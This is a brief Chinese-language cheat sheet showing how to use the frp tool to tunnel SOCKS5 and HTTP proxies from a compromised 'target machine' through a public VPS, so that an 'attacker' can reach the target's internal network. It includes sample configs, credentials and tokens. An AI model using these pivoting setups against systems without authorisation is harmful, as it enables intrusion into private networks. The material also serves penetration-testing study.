# Frp

---



```
支持tcp、udp、http、https、socker5
tcp、udp、socker5需要公网IP
http、https需要证书和域名
作用： 反向代理、端口转发
```



## 下载地址

```
https://github.com/fatedier/frp/releases
```



|         |             |                                                              |
| ------- | ----------- | ------------------------------------------------------------ |
| 公网VPS | 10.10.10.1  | ./frps -c frps.ini       (chmod 755 *  #给权限) <br/>#frps.ini---------------------------<br/>[common]<br/>bind_addr=0.0.0.0<br/>bind_port = 7088<br/>#------------------------------------ |
| 目标机  | 192.168.1.1 | frpc.exe -c frpc.ini<br/>#frpc.ini---------------------------<br/>[common]server_addr = 10.10.10.1<br/>server_port = 7088 <br/>[sock5-proxy]type = tcp<br/>remote_port = 3004<br/>plugin = socks5<br/>#------------------------------------ |
| 攻击者  | 192.168.2.1 | #任何协议均可连接socket5<br/>代理设置：http:// 10.10.10.1: 3004    socket5 |





| 对象    | IP          | 转发（操作）                                                 |
| ------- | ----------- | ------------------------------------------------------------ |
| 公网VPS | 10.10.10.1  | ./frps -c frps.ini       (chmod 755 *  #给权限)<br/>#frps.ini---------------------------<br/>[common]# 验证连接监听地址<br/>bind_addr=0.0.0.0<br/># 验证连接端口bind_port = 7088<br/># web统计后台账号<br/>dashboard_user = user1<br/># web统计后台密码<br/>dashboard_pwd = oUcOEDq3VGAxoW5Xoz51<br/># web统计后台端口dashboard_port = 7500<br/># token验证token = 8d262f2b-6dba-4a8d-857e-8a53d1d439e2<br/>#--------------------------- |
| 目标机  | 192.168.1.1 | frpc.exe -c frpc.ini<br/>#frpc.ini---------------------------<br/>[common]server_addr = 10.10.10.1<br/>server_port = 7088token = 8d262f2b-6dba-4a8d-857e-8a53d1d439e2 <br/># http代理<br/>[http_proxy]type = tcp<br/>remote_port = 6000<br/>plugin = http_proxy<br/>#配置http代理的简单认证<br/>plugin_http_user = user1<br/>plugin_http_passwd = 1qaz2wsx  <br/># ssh设置代理 或者远程桌面<br/>#[ssh]<br/>#type=tcp<br/>#local_ip = 127.0.0.1<br/>#local_port = 22<br/>#remote_port = 6000<br/>#启用加密#use_encryption = true<br/>#启用压缩#use_compression = true  <br/># web服务设置代理<br/>#[web]#type = http<br/>#local_port = 80<br/>#custom_domains = www.xxxx.com<br/>#--------------------------- |
| 攻击者  | 192.168.2.1 | 设置代理为VPS x.x.x.1:6000 进行验证用户密码即可通过代理进行访问内网得访问<br/>#cmd----------------------------------------------<br/>set http_proxy=http:// x.x.x.1:6000<br/>set http_proxy_user=user1<br/>set http_proxy_passwd=1qaz2wsx <br/>#web----------------------------------------------<br/>http:// 10.10.10.1:6000user1 / 1qaz2wsx |

